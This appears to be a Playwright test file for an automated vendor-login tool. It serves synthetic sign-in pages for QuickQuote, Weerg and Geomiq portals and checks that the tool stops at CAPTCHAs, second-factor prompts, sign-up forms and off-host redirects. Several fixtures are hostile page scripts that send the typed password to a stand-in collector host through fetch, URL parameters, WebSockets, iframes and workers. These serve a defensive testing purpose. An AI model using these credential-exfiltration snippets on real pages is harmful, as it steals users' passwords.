// @vitest-environment node

import fs from "node:fs/promises";
import os from "node:os";
import path from "node:path";
import { chromium, type Browser, type BrowserContext, type Request, type Route } from "playwright";
import { afterAll, afterEach, beforeAll, describe, expect, it } from "vitest";
import {
  PRODUCTION_PORTAL_BROWSER_TIMEOUT_MS,
  sandboxedChromiumLaunchOptions,
} from "../../test-support/localPortalBrowserFixture";
import type { SessionProbeEvidence } from "../providerSessionProbe";
import { loginVendors, statusLine, type VendorLoginDeps } from "./vendorLogin";
import { SecretString } from "./vendorLoginBitwarden";
import { sessionStatePath, type UnattendedLoginVendor } from "./vendorSession";

/**
 * OVD-1060 browser fixtures. Every page below is synthetic, written for this
 * test, and served by route interception under the vendors' real host names
 * so the reviewed host rules are exercised. Chromium resolves no host names
 * at all, so a request the fixture does not answer fails instead of reaching
 * a vendor. Credentials are fake and the Bitwarden vault is a stub.
 */

const USERNAME = "fixture-user@example.test";
const PASSWORD = "fixture-vendor-password-SENTINEL";
const WRONG_PASSWORD = "fixture-wrong-password-SENTINEL";

type Served = { status?: number; contentType?: string; headers?: Record<string, string>; body: string };
type Site = Record<string, Served | ((request: Request) => Served)>;
type Observed = { requests: string[]; posts: Array<{ target: string; body: string }>; sockets: string[] };

const html = (body: string): Served => ({ body });
const json = (status: number, body: unknown): Served => ({ status, contentType: "application/json", body: JSON.stringify(body) });

const SIGNED_IN = `document.cookie.split("; ").includes("ovd_fixture=signed-in")`;
const SIGN_IN_COOKIE = `document.cookie = "ovd_fixture=signed-in; path=/; Secure; SameSite=Lax";`;

const INVISIBLE_RECAPTCHA = `
  <iframe src="https://www.google.com/recaptcha/api2/anchor?k=fixture&size=invisible" style="position:fixed;bottom:0;right:0;width:256px;height:60px;border:0"></iframe>
  <div style="visibility:hidden;position:absolute;top:-10000px"><iframe src="https://www.google.com/recaptcha/api2/bframe?k=fixture" style="width:400px;height:580px"></iframe></div>`;
const VISIBLE_RECAPTCHA = `<iframe src="https://www.google.com/recaptcha/api2/anchor?k=fixture&size=normal" style="width:304px;height:78px;border:0"></iframe>`;

type AppOptions = {
  captcha?: string;
  offHost?: boolean;
  noForm?: boolean;
  /** Replaces the sign-in form markup (a JS string expression). */
  form?: string;
  /** Extra script run on submit, before the login request (a JS statement; `login` is the form). */
  onSubmit?: string;
  /** Extra script run after a successful login, before the reload. */
  afterLogin?: string;
};

const SIGN_IN_FORM = `'<form id="login"><label>Email <input type="email" name="email" autocomplete="username"></label>'
      + '<label>Password <input type="password" name="password" autocomplete="current-password"></label>'
      + '<button type="submit">Sign in</button><p role="alert" id="error"></p></form>'`;

/** A hash-routed single-page app shaped like a QuickQuote login, entirely synthetic. */
function quickpartsApp(options: AppOptions = {}): string {
  const form = options.noForm ? `'<p>Welcome to the fixture portal.</p>'` : options.form ?? SIGN_IN_FORM;
  return `<!doctype html><html><head><title>QuickQuote fixture</title></head><body><div id="app"></div>${options.captcha ?? INVISIBLE_RECAPTCHA}
    <script>
      const signedIn = ${SIGNED_IN};
      const app = document.getElementById("app");
      function render() {
        if (${Boolean(options.offHost)} && !signedIn) { location.href = "https://sso.idp-fixture.test/authorize"; return; }
        if (!signedIn && location.hash !== "#/login") { location.hash = "#/login"; return; }
        if (signedIn && location.hash === "#/login") { location.hash = "#/"; return; }
        if (!signedIn) {
          app.innerHTML = ${form};
          const login = document.getElementById("login");
          if (login) login.addEventListener("submit", async (event) => {
            if (login.target) return;
            event.preventDefault();
            ${options.onSubmit ?? ""}
            const response = await fetch(login.getAttribute("data-endpoint") || "/api/login", { method: "POST", body: new URLSearchParams(new FormData(login)) });
            const data = await response.json().catch(() => ({}));
            if (!response.ok) { document.getElementById("error").textContent = "Invalid email or password."; return; }
            if (data.mfa) { app.innerHTML = '<label>Verification code <input name="code" autocomplete="one-time-code"></label>'; return; }
            if (data.approve) { app.innerHTML = '<p>Approve the sign-in request on your phone to continue.</p>'; return; }
            ${SIGN_IN_COOKIE}
            ${options.afterLogin ?? ""}
            location.hash = "#/";
            location.reload();
          });
          return;
        }
        app.innerHTML = '<h1>Upload a part</h1><input type="file"><nav><a href="#/logout">Log out</a></nav>';
      }
      window.addEventListener("hashchange", render);
      render();
    </script></body></html>`;
}

function loginResponder(onSuccess: unknown = { ok: true }) {
  return (request: Request): Served => {
    const body = new URLSearchParams(request.postData() ?? "");
    const user = body.get("email") ?? body.get("username");
    return user === USERNAME && body.get("password") === PASSWORD ? json(200, onSuccess) : json(401, { ok: false });
  };
}

const RECAPTCHA_FRAMES: Site = {
  "GET www.google.com/recaptcha/api2/anchor": html("<!doctype html><title>fixture frame</title>"),
  "GET www.google.com/recaptcha/api2/bframe": html("<!doctype html><title>fixture frame</title>"),
};

function quickpartsSite(app: string, onSuccess?: unknown): Site {
  return {
    ...RECAPTCHA_FRAMES,
    "GET quickquote.quickparts.com/": html(app),
    "POST quickquote.quickparts.com/api/login": loginResponder(onSuccess),
    "POST quickquote.quickparts.com/api/register": json(200, {}),
    "POST collector.offhost-fixture.test/c": json(200, {}),
    // A sibling subdomain and another port on a reviewed host: neither is a reviewed origin.
    "POST unreviewed.quickparts.com/c": json(200, {}),
    "POST quickquote.quickparts.com:8443/c": json(200, {}),
    "GET collector.offhost-fixture.test/c": html(""),
  };
}

/** A home page whose sign-in control opens a menu of links, next to a newsletter box. */
function menuLoginSite(): Site {
  const home = `<!doctype html><title>Weerg fixture</title><body>
    <header><button id="account" type="button">Login</button><nav id="menu" hidden><a href="/help">Help</a><a href="/orders">Orders</a></nav></header>
    <form id="newsletter"><input type="email" name="email" placeholder="Your email"><button type="submit">Subscribe</button></form>
    <script>
      document.getElementById("account").addEventListener("click", () => { document.getElementById("menu").hidden = false; });
      document.getElementById("newsletter").addEventListener("submit", (event) => { event.preventDefault(); fetch("/api/newsletter", { method: "POST" }); });
    </script></body>`;
  return { "GET www.weerg.com/": html(home), "POST www.weerg.com/api/newsletter": json(200, {}) };
}

/** A home page with a newsletter box and a modal sign-in, shaped like a marketing-site login. */
function weergSite(): Site {
  const home = `<!doctype html><html><head><title>Weerg fixture</title></head><body>
    <header><button id="open-login" type="button">Login</button></header>
    <form id="newsletter"><input type="email" name="email" placeholder="Your email"><button type="submit">Subscribe</button></form>
    <div id="modal" hidden><form id="login"><input type="text" name="username" autocomplete="username">
      <input type="password" name="password"><button type="submit">Sign in</button><div role="alert" id="error"></div></form></div>
    <script>
      if (${SIGNED_IN}) { document.querySelector("header").innerHTML = '<a href="/logout">Log out</a>'; document.getElementById("modal").remove(); }
      document.getElementById("open-login")?.addEventListener("click", () => { document.getElementById("modal").hidden = false; });
      document.getElementById("newsletter").addEventListener("submit", (event) => { event.preventDefault(); fetch("/api/newsletter", { method: "POST" }); });
      document.getElementById("login")?.addEventListener("submit", async (event) => {
        event.preventDefault();
        const response = await fetch("/api/login", { method: "POST", body: new URLSearchParams(new FormData(event.target)) });
        if (!response.ok) { document.getElementById("error").textContent = "Wrong password"; return; }
        ${SIGN_IN_COOKIE}
        location.href = "/en/global/quotation-tool/upload";
      });
    </script></body></html>`;
  const upload = `<!doctype html><title>Weerg upload fixture</title><body><main id="main"></main><script>
      document.getElementById("main").innerHTML = ${SIGNED_IN}
        ? '<h1>Upload your CAD</h1><input type="file"><a href="/logout">Log out</a>'
        : '<p>Session expired</p>';
    </script></body>`;
  return {
    "GET www.weerg.com/": html(home),
    "GET www.weerg.com/en/global/quotation-tool/upload": html(upload),
    "POST www.weerg.com/api/login": loginResponder(),
    "POST www.weerg.com/api/newsletter": json(200, {}),
  };
}

/** Email first, then password, on a sign-in route with no form element at all. */
function formlessTwoStepSite(): Site {
  const page = `<!doctype html><title>Geomiq fixture</title><body><main id="main">
      <label>Email <input type="email" id="email"></label><button type="button" id="next">Next</button>
    </main><script>
      if (${SIGNED_IN}) location.replace("/");
      document.getElementById("next").addEventListener("click", () => {
        const email = document.getElementById("email").value;
        document.getElementById("main").innerHTML = '<label>Password <input type="password" id="password"></label><button type="button" id="go">Log in</button>';
        document.getElementById("go").addEventListener("click", async () => {
          const body = new URLSearchParams({ email, password: document.getElementById("password").value });
          const response = await fetch("/api/login", { method: "POST", body });
          if (response.ok) { ${SIGN_IN_COOKIE} location.href = "/"; }
        });
      });
    </script></body>`;
  return { ...geomiqSite(), "GET app.geomiq.com/login": html(page) };
}

/** Email first, then password on a second step. */
function geomiqSite(): Site {
  const root = `<!doctype html><title>Geomiq fixture</title><body><main id="main"></main><script>
      if (!${SIGNED_IN}) location.replace("/login");
      else document.getElementById("main").innerHTML = '<h1>Your parts</h1><button type="button">Sign out</button>';
    </script></body>`;
  const login = `<!doctype html><title>Geomiq sign-in fixture</title><body><main id="main">
      <form id="email-step"><label>Email <input type="email" name="email"></label><button type="submit">Continue</button></form>
    </main><script>
      document.getElementById("email-step").addEventListener("submit", (event) => {
        event.preventDefault();
        const email = new FormData(event.target).get("email");
        document.getElementById("main").innerHTML = '<form id="password-step"><label>Password <input type="password" name="password"></label>'
          + '<button type="submit">Log in</button></form>';
        document.getElementById("password-step").addEventListener("submit", async (next) => {
          next.preventDefault();
          const body = new URLSearchParams({ email, password: new FormData(next.target).get("password") });
          const response = await fetch("/api/login", { method: "POST", body });
          if (response.ok) { ${SIGN_IN_COOKIE} location.href = "/"; }
        });
      });
    </script></body>`;
  return {
    "GET app.geomiq.com/": html(root),
    "GET app.geomiq.com/login": html(login),
    "POST app.geomiq.com/api/login": loginResponder(),
  };
}

let sharedBrowser: Browser;
let stateDir: string;

beforeAll(async () => {
  sharedBrowser = await chromium.launch({
    ...sandboxedChromiumLaunchOptions(),
    headless: true,
    // No host name resolves: anything the fixture does not answer fails locally.
    args: ["--host-resolver-rules=MAP * ~NOTFOUND"],
  });
}, PRODUCTION_PORTAL_BROWSER_TIMEOUT_MS);

afterAll(async () => {
  await sharedBrowser?.close();
});

afterEach(async () => {
  if (stateDir) await fs.rm(stateDir, { recursive: true, force: true });
});

/** Hands the tool a browser whose close() only closes the contexts it opened. */
function borrowedBrowser(): Browser {
  const contexts: BrowserContext[] = [];
  return {
    newContext: async (options?: Parameters<Browser["newContext"]>[0]) => {
      const context = await sharedBrowser.newContext(options);
      contexts.push(context);
      return context;
    },
    close: async () => {
      await Promise.all(contexts.map((context) => context.close().catch(() => undefined)));
    },
  } as unknown as Browser;
}

async function serve(context: BrowserContext, site: Site, observed: Observed) {
  // Third-party CAPTCHA state that must never reach a saved session.
  await context.addCookies([{ name: "NID", value: "fixture-third-party", domain: ".google.com", path: "/", secure: true, sameSite: "None" }]);
  const responseFor = (request: Request): Served => {
    const url = new URL(request.url());
    const key = `${request.method()} ${url.host}${url.pathname}`;
    observed.requests.push(key);
    if (request.method() === "POST") observed.posts.push({ target: `${url.host}${url.pathname}`, body: request.postData() ?? "" });
    const entry = site[key];
    return !entry ? { status: 404, body: "" } : typeof entry === "function" ? entry(request) : entry;
  };
  await context.route("**/*", async (route) => {
    const response = responseFor(route.request());
    await route.fulfill({ ...response, status: response.status ?? 200, contentType: response.contentType ?? "text/html" });
  });
  // Supply synthetic HTTP responses to the production document fetch too.
  // The production handler still installs the CSP and Chromium enforces it.
  const registerRoute = context.route.bind(context);
  context.route = ((url, handler, options) => registerRoute(url, (route, request) => handler(new Proxy(route, {
    get(target, property) {
      if (property === "fetch") return async () => {
        const response = responseFor(request);
        return {
          status: () => response.status ?? 200,
          headers: () => ({ "content-type": response.contentType ?? "text/html", ...response.headers }),
          body: async () => Buffer.from(response.body),
          dispose: async () => undefined,
        };
      };
      const value = Reflect.get(target, property);
      return typeof value === "function" ? value.bind(target) : value;
    },
  }) as Route, request), options)) as BrowserContext["route"];
  // CDP observes native connection attempts independently of routeWebSocket
  // handler precedence. DNS is disabled, so even an allow-all mutation is local.
  const newPage = context.newPage.bind(context);
  context.newPage = async () => {
    const page = await newPage();
    const session = await context.newCDPSession(page);
    await session.send("Network.enable");
    session.on("Network.webSocketCreated", ({ url }) => observed.sockets.push(url));
    return page;
  };
}

const authenticatedEvidence = (vendor: UnattendedLoginVendor): SessionProbeEvidence => ({
  provider: vendor, timestamp: "2026-10-22T00:00:00.000Z", outcome: "authenticated", reason: "authenticated_marker_found",
  finalHost: null, httpStatus: 200, navigations: 1, blockedRequests: 0,
});

async function runLogin(vendor: UnattendedLoginVendor, site: Site, password = PASSWORD, allowAllSockets = false) {
  stateDir = await fs.realpath(await fs.mkdtemp(path.join(os.tmpdir(), "ovd-vendor-login-browser-")));
  const observed: Observed = { requests: [], posts: [], sockets: [] };
  const lines: string[] = [];
  const deps: VendorLoginDeps = {
    config: {
      headless: true,
      bitwarden: { cliPath: "bw", unlock: "session-env" },
      vendors: { [vendor]: { item: `fixture-${vendor}-item` } },
    },
    stateDir,
    force: false,
    env: {},
    vault: {
      open: async () => undefined,
      loginItem: async () => ({ username: new SecretString(USERNAME), password: new SecretString(password) }),
      close: async () => undefined,
    },
    launchBrowser: async () => borrowedBrowser(),
    prepareContext: async (context) => {
      await serve(context, site, observed);
      if (allowAllSockets) {
        const register = context.routeWebSocket.bind(context);
        context.routeWebSocket = (url) => register(url, (socket) => { socket.connectToServer(); });
      }
    },
    // The GET-only probe launches its own browser against the network, so it is stubbed here;
    // vendorSession.browser.test.ts runs it against a loopback server.
    sessionDeps: {
      probe: async (options) => {
        await options.onAuthenticated?.(options.storageState);
        return authenticatedEvidence(vendor);
      },
    },
    timings: { settleMs: 1_500, outcomeMs: 6_000, pollMs: 150 },
    report: async (result) => {
      lines.push(statusLine(result, new Date()));
    },
  };
  const [result] = await loginVendors([vendor], deps);
  const savedPath = sessionStatePath(stateDir, vendor);
  const saved = await fs.readFile(savedPath, "utf8").then((text) => JSON.parse(text), () => null);
  return { result, observed, lines, saved, savedPath };
}

function expectNoSecretIn(lines: readonly string[]) {
  for (const line of lines) {
    expect(line).not.toContain(PASSWORD);
    expect(line).not.toContain(WRONG_PASSWORD);
    expect(line).not.toContain(USERNAME);
  }
}

describe("login:vendors against synthetic portals", () => {
  it("signs in to a hash-routed app behind an invisible reCAPTCHA and saves only the vendor's hosts", async () => {
    const { result, observed, lines, saved, savedPath } = await runLogin("quickparts", quickpartsSite(quickpartsApp()));
    expect(result).toMatchObject({ outcome: "saved", reason: "password_login_confirmed", check: "valid:authenticated_marker_found" });
    expect(observed.posts).toHaveLength(1);
    expect(observed.posts[0].target).toBe("quickquote.quickparts.com/api/login");
    expect(new URLSearchParams(observed.posts[0].body).get("password")).toBe(PASSWORD);
    expect(saved.cookies.map((cookie: { name: string; domain: string }) => `${cookie.name}@${cookie.domain}`)).toEqual([
      "ovd_fixture@quickquote.quickparts.com",
    ]);
    expect(JSON.stringify(saved)).not.toContain(PASSWORD);
    expect((await fs.stat(savedPath)).mode & 0o777).toBe(0o600);
    expectNoSecretIn(lines);
  }, PRODUCTION_PORTAL_BROWSER_TIMEOUT_MS);

  it("stops at a visible CAPTCHA before typing anything", async () => {
    const { result, observed, saved } = await runLogin("quickparts", quickpartsSite(quickpartsApp({ captcha: VISIBLE_RECAPTCHA })));
    expect(result).toMatchObject({ outcome: "stopped", reason: "captcha:visible_challenge", host: "quickquote.quickparts.com" });
    expect(observed.posts).toEqual([]);
    expect(saved).toBeNull();
  }, PRODUCTION_PORTAL_BROWSER_TIMEOUT_MS);

  it("stops after one rejected login and never resubmits", async () => {
    const { result, observed, saved, lines } = await runLogin("quickparts", quickpartsSite(quickpartsApp()), WRONG_PASSWORD);
    expect(result).toMatchObject({ outcome: "stopped", reason: "login_failed:credentials_rejected" });
    expect(observed.posts).toHaveLength(1);
    expect(saved).toBeNull();
    expectNoSecretIn(lines);
  }, PRODUCTION_PORTAL_BROWSER_TIMEOUT_MS);

  it("stops at a second-factor prompt", async () => {
    const { result, observed, saved } = await runLogin("quickparts", quickpartsSite(quickpartsApp(), { mfa: true }));
    expect(result).toMatchObject({ outcome: "stopped", reason: "two_factor:second_factor_prompt" });
    expect(observed.posts).toHaveLength(1);
    expect(saved).toBeNull();
  }, PRODUCTION_PORTAL_BROWSER_TIMEOUT_MS);

  it("refuses a redirect to an unreviewed sign-in host without requesting it", async () => {
    const { result, observed, saved } = await runLogin("quickparts", quickpartsSite(quickpartsApp({ offHost: true })));
    expect(result).toMatchObject({ outcome: "stopped", reason: "unknown_page:off_host_navigation", host: "sso.idp-fixture.test" });
    expect(observed.requests.some((request) => request.includes("idp-fixture.test"))).toBe(false);
    expect(observed.posts).toEqual([]);
    expect(saved).toBeNull();
  }, PRODUCTION_PORTAL_BROWSER_TIMEOUT_MS);

  it("stops on a page with no sign-in form", async () => {
    const { result, observed } = await runLogin("quickparts", quickpartsSite(quickpartsApp({ noForm: true })));
    expect(result).toMatchObject({ outcome: "stopped", reason: "unknown_page:login_form_not_found" });
    expect(observed.posts).toEqual([]);
  }, PRODUCTION_PORTAL_BROWSER_TIMEOUT_MS);

  it("opens a modal sign-in on a home page and never fills its newsletter box", async () => {
    const { result, observed, saved } = await runLogin("weerg", weergSite());
    expect(result).toMatchObject({ outcome: "saved" });
    expect(observed.posts.map((post) => post.target)).toEqual(["www.weerg.com/api/login"]);
    expect(saved.cookies.map((cookie: { domain: string }) => cookie.domain)).toEqual(["www.weerg.com"]);
  }, PRODUCTION_PORTAL_BROWSER_TIMEOUT_MS);

  it("never fills or submits a sign-up form that has the only password field", async () => {
    const signUp = `'<form id="login" data-endpoint="/api/register"><label>Email <input type="email" name="email"></label>'
      + '<label>Password <input type="password" name="password"></label><button type="submit">Create account</button></form>'`;
    const { result, observed } = await runLogin("quickparts", quickpartsSite(quickpartsApp({ form: signUp })));
    expect(result).toMatchObject({ outcome: "stopped", reason: "unknown_page:registration_or_reset_form" });
    expect(observed.posts).toEqual([]);
  }, PRODUCTION_PORTAL_BROWSER_TIMEOUT_MS);

  it("picks the sign-in form over a sign-up form above it", async () => {
    const both = `'<form id="signup" data-endpoint="/api/register"><input type="email" name="email"><input type="password" name="password" autocomplete="new-password">'
      + '<button type="submit">Create account</button></form>' + ${SIGN_IN_FORM}`;
    const { result, observed } = await runLogin("quickparts", quickpartsSite(quickpartsApp({ form: both })));
    expect(result).toMatchObject({ outcome: "saved" });
    expect(observed.posts.map((post) => post.target)).toEqual(["quickquote.quickparts.com/api/login"]);
  }, PRODUCTION_PORTAL_BROWSER_TIMEOUT_MS);

  it("aborts a page script that posts the password to another host", async () => {
    const exfiltrate = `fetch("https://collector.offhost-fixture.test/c", { method: "POST", body: new FormData(login).get("password") }).catch(() => {});`;
    const { result, observed } = await runLogin("quickparts", quickpartsSite(quickpartsApp({ onSubmit: exfiltrate })));
    expect(result).toMatchObject({ outcome: "saved" });
    expect(observed.requests.some((request) => request.includes("offhost-fixture.test"))).toBe(false);
  }, PRODUCTION_PORTAL_BROWSER_TIMEOUT_MS);

  it("aborts posts of the password to a sibling subdomain or another port of a reviewed host", async () => {
    const exfiltrate = `const typed = new FormData(login).get("password");
      for (const target of ["https://unreviewed.quickparts.com/c", "https://quickquote.quickparts.com:8443/c"]) {
        fetch(target, { method: "POST", body: typed }).catch(() => {});
      }
      await new Promise((resolve) => setTimeout(resolve, 300));`;
    const { result, observed } = await runLogin("quickparts", quickpartsSite(quickpartsApp({ onSubmit: exfiltrate })));
    expect(result).toMatchObject({ outcome: "saved" });
    expect(observed.posts.map((post) => post.target)).toEqual(["quickquote.quickparts.com/api/login"]);
    expect(observed.requests.some((request) => request.includes("unreviewed.quickparts.com") || request.includes(":8443"))).toBe(false);
  }, PRODUCTION_PORTAL_BROWSER_TIMEOUT_MS);

  it("stops before typing into a form that submits to a sibling subdomain of a reviewed host", async () => {
    const form = `'<form id="login" method="post" action="https://unreviewed.quickparts.com/c">'
      + '<input type="email" name="email" autocomplete="username"><input type="password" name="password" autocomplete="current-password">'
      + '<button type="submit">Sign in</button></form>'`;
    const { result, observed } = await runLogin("quickparts", quickpartsSite(quickpartsApp({ form })));
    expect(result).toMatchObject({ outcome: "stopped", reason: "unknown_page:form_submits_off_host", host: "unreviewed.quickparts.com" });
    expect(observed.posts).toEqual([]);
  }, PRODUCTION_PORTAL_BROWSER_TIMEOUT_MS);

  it("aborts a child frame's script that posts the password to another host", async () => {
    // A same-origin frame reads the parent's field and posts from its own context, neither a main-frame request nor a navigation.
    const exfiltrate = `const sink = document.createElement("iframe");
      sink.srcdoc = "<script>fetch('https://collector.offhost-fixture.test/c', { method: 'POST', body: parent.document.querySelector('[name=password]').value }).catch(() => {});<\\/script>";
      document.body.appendChild(sink);
      await new Promise((resolve) => setTimeout(resolve, 500));`;
    const { result, observed } = await runLogin("quickparts", quickpartsSite(quickpartsApp({ onSubmit: exfiltrate })));
    expect(result).toMatchObject({ outcome: "saved" });
    expect(observed.posts.map((post) => post.target)).toEqual(["quickquote.quickparts.com/api/login"]);
    expect(observed.requests.some((request) => request.includes("offhost-fixture.test"))).toBe(false);
  }, PRODUCTION_PORTAL_BROWSER_TIMEOUT_MS);

  it.each([false, true])("observes native WebSocket attempts independently (allow-all mutation: %s)", async (allowAll) => {
    const exfiltrate = `const typed = new FormData(login).get("password");
      const send = (url) => { try { const socket = new WebSocket(url); socket.onopen = () => socket.send(typed); } catch {} };
      send("wss://collector.offhost-fixture.test/s");
      send("wss://unreviewed.quickparts.com/s");
      send("wss://quickquote.quickparts.com/control");
      const sink = document.createElement("iframe");
      sink.srcdoc = "<script>const s = new WebSocket('wss://collector.offhost-fixture.test/frame'); s.onopen = () => s.send(parent.document.querySelector('[name=password]').value);<\\/script>";
      document.body.appendChild(sink);
      await new Promise((resolve) => setTimeout(resolve, 500));`;
    const { result, observed } = await runLogin("quickparts", quickpartsSite(quickpartsApp({ onSubmit: exfiltrate })), PASSWORD, allowAll);
    expect(result.outcome).toBe("saved");
    const refused = ["wss://collector.offhost-fixture.test/s", "wss://unreviewed.quickparts.com/s", "wss://collector.offhost-fixture.test/frame"];
    expect(observed.sockets.sort()).toEqual(["wss://quickquote.quickparts.com/control", ...(allowAll ? refused : [])].sort());
  }, PRODUCTION_PORTAL_BROWSER_TIMEOUT_MS);

  it("refuses worker execution and egress in the page and a fresh child realm", async () => {
    const attemptWorkers = `
      const ran = [];
      const violations = [];
      const child = document.createElement('iframe');
      document.body.appendChild(child);
      for (const realm of [window, child.contentWindow]) {
        realm.document.addEventListener('securitypolicyviolation', (event) => violations.push(event.effectiveDirective));
        const code = "const send = (password) => { const s = new WebSocket('wss://collector.offhost-fixture.test/worker'); s.onopen = () => s.send(password); fetch('https://collector.offhost-fixture.test/c', {method:'POST', body:password}).catch(() => {}); }; onmessage = (e) => { postMessage('ran'); send(e.data); }; onconnect = (e) => { e.ports[0].onmessage = (m) => { e.ports[0].postMessage('ran'); send(m.data); }; e.ports[0].start(); };";
        for (const kind of ['Worker', 'SharedWorker']) {
          for (const url of [URL.createObjectURL(new Blob([code], {type: 'text/javascript'})), 'data:text/javascript,' + encodeURIComponent(code)]) {
            try {
              const worker = new realm[kind](url);
              const port = worker.port || worker;
              port.onmessage = () => ran.push(kind);
              if (worker.port) port.start();
              port.postMessage(new FormData(login).get('password'));
            } catch {}
          }
        }
      }
      let serviceRegistered = false;
      // Exercise native registration under CSP, beyond Playwright's instance stub.
      await ServiceWorkerContainer.prototype.register.call(navigator.serviceWorker, '/fixture-worker.js')
        .then(() => { serviceRegistered = true; }, () => {});
      await new Promise((resolve) => setTimeout(resolve, 500));
      await fetch('/worker-results', {method: 'POST', body: JSON.stringify({ran, violations, serviceRegistered})});`;
    const site = quickpartsSite(quickpartsApp({ onSubmit: attemptWorkers }));
    site["POST quickquote.quickparts.com/worker-results"] = json(200, {});
    site["GET quickquote.quickparts.com/fixture-worker.js"] = { contentType: "text/javascript", body: "self.addEventListener('install', () => self.skipWaiting());" };
    const { result, observed } = await runLogin("quickparts", site);
    expect(result.outcome).toBe("saved");
    const report = observed.posts.find((post) => post.target.endsWith("/worker-results"));
    expect(report).toBeDefined();
    const evidence = JSON.parse(report!.body);
    expect(evidence.ran).toEqual([]);
    expect(evidence.serviceRegistered).toBe(false);
    expect(evidence.violations).toContain("worker-src");
    expect(observed.sockets).toEqual([]);
    expect(observed.requests.some((request) => request.includes("offhost-fixture.test"))).toBe(false);
  }, PRODUCTION_PORTAL_BROWSER_TIMEOUT_MS);

  it("aborts a sign-in form that targets a popup or an iframe on another host", async () => {
    for (const target of ["_blank", "sink"]) {
      const form = `'<iframe name="sink" style="width:10px;height:10px"></iframe><form id="login" target="${target}" method="post" action="https://collector.offhost-fixture.test/c">'
        + '<input type="email" name="email" autocomplete="username"><input type="password" name="password" autocomplete="current-password">'
        + '<button type="submit">Sign in</button></form>'`;
      const { result, observed, saved } = await runLogin("quickparts", quickpartsSite(quickpartsApp({ form })));
      expect(result.outcome).toBe("stopped");
      expect(observed.requests.some((request) => request.includes("offhost-fixture.test"))).toBe(false);
      expect(saved).toBeNull();
    }
  }, PRODUCTION_PORTAL_BROWSER_TIMEOUT_MS);

  it("refuses to save a session where the page kept the typed password", async () => {
    const remember = `localStorage.setItem("remember", new FormData(document.getElementById("login")).get("password"));`;
    const app = quickpartsApp({ onSubmit: remember });
    const { result, saved } = await runLogin("quickparts", quickpartsSite(app));
    expect(result).toMatchObject({ outcome: "stopped", reason: "not_saved:session_contains_credential" });
    expect(saved).toBeNull();
  }, PRODUCTION_PORTAL_BROWSER_TIMEOUT_MS);

  it("stops at a text-only sign-in approval prompt", async () => {
    const { result, saved } = await runLogin("quickparts", quickpartsSite(quickpartsApp(), { approve: true }));
    expect(result).toMatchObject({ outcome: "stopped", reason: "two_factor:second_factor_prompt" });
    expect(saved).toBeNull();
  }, PRODUCTION_PORTAL_BROWSER_TIMEOUT_MS);

  it("never puts the account email into a newsletter box next to a menu-style sign-in control", async () => {
    const { result, observed } = await runLogin("weerg", menuLoginSite());
    expect(result.outcome).toBe("stopped");
    expect(observed.posts).toEqual([]);
  }, PRODUCTION_PORTAL_BROWSER_TIMEOUT_MS);

  it("stops before typing into a form that submits by GET into a frame on another host", async () => {
    const form = `'<iframe name="sink" style="width:10px;height:10px"></iframe><form id="login" target="sink" method="get" action="https://collector.offhost-fixture.test/c">'
      + '<input type="email" name="email" autocomplete="username"><input type="password" name="password" autocomplete="current-password">'
      + '<button type="submit">Sign in</button></form>'`;
    const { result, observed } = await runLogin("quickparts", quickpartsSite(quickpartsApp({ form })));
    expect(result).toMatchObject({ outcome: "stopped", reason: "unknown_page:form_submits_off_host" });
    expect(observed.requests.some((request) => request.includes("offhost-fixture.test"))).toBe(false);
  }, PRODUCTION_PORTAL_BROWSER_TIMEOUT_MS);

  it("aborts a page script that puts the password in an off-host URL", async () => {
    const leak = `fetch("https://collector.offhost-fixture.test/c?p=" + encodeURIComponent(new FormData(login).get("password"))).catch(() => {});`;
    const { result, observed } = await runLogin("quickparts", quickpartsSite(quickpartsApp({ onSubmit: leak })));
    expect(result).toMatchObject({ outcome: "saved" });
    expect(observed.requests.some((request) => request.includes("offhost-fixture.test"))).toBe(false);
  }, PRODUCTION_PORTAL_BROWSER_TIMEOUT_MS);

  it("never submits a create-account form behind a generic Continue button", async () => {
    const signUp = `'<form id="login" data-endpoint="/api/register"><h2>Create account</h2><input type="email" name="email">'
      + '<input type="password" name="password"><button type="submit">Continue</button></form>'`;
    const { result, observed } = await runLogin("quickparts", quickpartsSite(quickpartsApp({ form: signUp })));
    expect(result).toMatchObject({ outcome: "stopped", reason: "unknown_page:registration_or_reset_form" });
    expect(observed.posts).toEqual([]);
  }, PRODUCTION_PORTAL_BROWSER_TIMEOUT_MS);

  it("skips a new-password field even when the sign-in field carries no autocomplete hint", async () => {
    const both = `'<form id="signup" data-endpoint="/api/register"><input type="email" name="email"><input type="password" name="password" autocomplete="new-password">'
      + '<button type="submit">Create account</button></form>'
      + '<form id="login"><input type="email" name="email"><input type="password" name="password"><button type="submit">Sign in</button></form>'`;
    const { result, observed } = await runLogin("quickparts", quickpartsSite(quickpartsApp({ form: both })));
    expect(result).toMatchObject({ outcome: "saved" });
    expect(observed.posts.map((post) => post.target)).toEqual(["quickquote.quickparts.com/api/login"]);
  }, PRODUCTION_PORTAL_BROWSER_TIMEOUT_MS);

  it("handles an email-first sign-in with no form element on a sign-in route", async () => {
    const { result, observed } = await runLogin("geomiq", formlessTwoStepSite());
    expect(result).toMatchObject({ outcome: "saved" });
    expect(observed.posts.map((post) => post.target)).toEqual(["app.geomiq.com/api/login"]);
  }, PRODUCTION_PORTAL_BROWSER_TIMEOUT_MS);

  it("handles an email-first, password-second sign-in", async () => {
    const { result, observed, saved } = await runLogin("geomiq", geomiqSite());
    expect(result).toMatchObject({ outcome: "saved" });
    expect(observed.posts).toHaveLength(1);
    const body = new URLSearchParams(observed.posts[0].body);
    expect([body.get("email"), body.get("password")]).toEqual([USERNAME, PASSWORD]);
    expect(saved.cookies.map((cookie: { domain: string }) => cookie.domain)).toEqual(["app.geomiq.com"]);
  }, PRODUCTION_PORTAL_BROWSER_TIMEOUT_MS);
});
